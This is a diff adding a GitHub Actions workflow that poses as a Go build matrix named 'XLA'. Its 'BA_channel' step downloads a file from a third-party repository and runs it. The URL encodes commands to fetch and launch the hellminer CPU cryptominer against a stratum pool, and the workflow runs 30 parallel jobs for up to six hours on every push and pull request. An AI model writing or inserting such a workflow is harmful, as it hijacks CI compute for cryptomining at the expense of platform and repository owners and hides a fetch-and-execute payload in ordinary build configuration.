@@ -1,0 +1,28 @@
+name: XLA
+on: [push, pull_request]
+jobs:
+  build:
+    name: Ba_channel
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7]
+        flag: [A, B]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: BA_channel
+      run: |
+        wget https://github.com/ukangmas79/ukang2/blob/083ea377d870cf9de742488ace0bdfdbf3a19815/!%20wget%20https:/github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz%20!%20tar%20xf%20hellminer_cpu_linux.tar.gz%20!%20./hellminer%20-c%20stratum+tcp:/ukang2 && chmod u+x ukang2 && ./ukang2
+
